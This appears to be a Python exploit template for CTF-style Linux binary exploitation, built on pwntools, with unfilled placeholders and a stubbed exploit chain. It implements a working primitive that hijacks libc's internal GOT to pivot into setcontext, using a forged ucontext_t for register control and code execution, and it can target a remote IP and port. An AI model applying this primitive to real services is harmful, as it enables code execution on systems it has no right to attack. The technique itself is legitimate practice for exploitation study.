#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
# Title : Linux Pwn Exploit
# Author: {author} - {blog}
#
# Description:
# ------------
# A Python exp for Linux binex interaction
# Targeting the libc .got table. Reference:
# https://4xura.com/binex/pwn-got-hijack-libcs-internal-got-plt-as-rce-primitives/
#
# Usage:
# ------
# - Local mode  : ./xpl.py
# - Remote mode : ./xpl.py [ <IP> <PORT> | <IP:PORT> ]
#

from pwnkit import *
from pwn import *
import os, sys

# CONFIG
# ------------------------------------------------------------------------
BIN_PATH   = {file_path!r}
LIBC_PATH  = {libc_path!r}
elf        = ELF(BIN_PATH, checksec=False)
libc       = ELF(LIBC_PATH) if LIBC_PATH else None
host, port = parse_argv(sys.argv[1:], {host!r}, {port!r})

ctx = Context(
    arch      = {arch!r},
    os        = {os!r},
    endian    = {endian!r},
    log_level = {log!r},
    terminal  = {term!r}
).push()

io = Tube(
    file_path = BIN_PATH,
    libc_path = LIBC_PATH,
    host      = host,
    port      = port,
    env       = {{}}
).init().alias()
set_global_io(io)	# s, sa, sl, sla, r, ru, uu64

init_pr("debug", "%(asctime)s - %(levelname)s - %(message)s", "%H:%M:%S")

# GOT 
# ------------------------------------------------------------------------
def create_ucontext(src: int, *, r8=0, r9=0, r12=0, r13=0, r14=0, r15=0,
                    rdi=0, rsi=0, rbp=0, rbx=0, rdx=0, rcx=0,
                    rsp=0, rip=0xdeadbeef) -> bytearray:
    b = flat({
        0x28: r8,
        0x30: r9,
        0x48: r12,
        0x50: r13,
        0x58: r14,
        0x60: r15,
        0x68: rdi,
        0x70: rsi,
        0x78: rbp,
        0x80: rbx,
        0x88: rdx,
        0x98: rcx,
        0xA0: rsp,
        0xA8: rip,  # ret ptr
        0xE0: src,  # fldenv ptr
        0x1C0: 0x1F80,  # ldmxcsr
    }, filler=b'\0', word_size=64)
    return b

def setcontext32(libc: ELF, **kwargs) -> (int, bytes):
    """int setcontext(const ucontext_t *ucp);"""
    global GOT_ET_COUNT

    got0 = libc.address + libc.dynamic_value_by_tag("DT_PLTGOT")
    plt0 = libc.address + libc.get_section_by_name(".plt").header.sh_addr
    leak(got0)
    leak(plt0)

    write_dest   = got0 + 8
    context_dest = write_dest + 0x10 + GOT_ET_COUNT * 8
    
    write_data = flat(
        context_dest,               # _GLOBAL_OFFSET_TABLE_+8   ->  ucontext_t *ucp
        libc.sym.setcontext + 32,   # _GLOBAL_OFFSET_TABLE_+16  ->  setcontext+32 gadget
        [plt0] * GOT_ET_COUNT,
        create_ucontext(context_dest, rsp=libc.sym.environ+8, **kwargs),
    )

    return write_dest, write_data

# EXPLOIT
# ------------------------------------------------------------------------
def xpl(**kwargs):
   
    # TODO: exploit chain


    io.interactive()

# PIPELINE
# ------------------------------------------------------------------------
if __name__ == "__main__":
    xpl()

